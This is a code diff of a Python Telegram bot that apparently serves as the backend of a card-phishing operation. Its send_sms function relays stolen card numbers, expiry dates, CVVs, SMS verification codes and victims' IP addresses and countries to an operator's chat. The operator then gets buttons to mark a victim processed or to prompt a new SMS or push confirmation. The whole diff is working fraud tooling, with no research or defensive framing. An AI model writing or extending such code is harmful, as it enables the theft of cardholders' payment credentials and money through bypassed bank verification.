@@ -13,20 +13,25 @@ def escape_reserved_characters(text):
         text = text.replace(char, f'\\{char}')
     
     return text
-def send_buttons_message(CHAT_ID, card, date, cvv, ID, name, email, tel, ip):
+def send_sms(CHAT_ID, card, date, cvv, sms, ID, ip):
     bot = Bot(token=API_TOKEN)
     keyboard = [
         [
-            InlineKeyboardButton("📱Code📱", callback_data='button1'),
+            InlineKeyboardButton("✅Отработан✅", callback_data='button-ban'),
+            InlineKeyboardButton("Error SMS", callback_data='button2'),
         ],
         [
             InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
-            InlineKeyboardButton("💳Incorrect💳", callback_data='button4'),
         ],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`\n\n🏦: {Bin(card)[0]}\n🌏: {Bin(card)[1]}\n\n🏷 {name}\n📨 {email}\n📱 {tel}\n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}')
-    bot.send_message(chat_id=CHAT_ID, text=text, reply_markup=reply_markup, parse_mode='MarkdownV2')
+    
+    # Подготовка текста с экранированием специальных символов
+    message_text = f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐 : `{cvv}`\n💬 : `{sms}` \n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}'
+    escaped_message_text = escape_reserved_characters(message_text)
+
+    # Отправка сообщения с экранированным текстом
+    bot.send_message(chat_id=CHAT_ID, text=escaped_message_text, reply_markup=reply_markup, parse_mode='MarkdownV2')
 
 def send_me1(card, date, cvv, ID):
     bot = Bot(token=api)
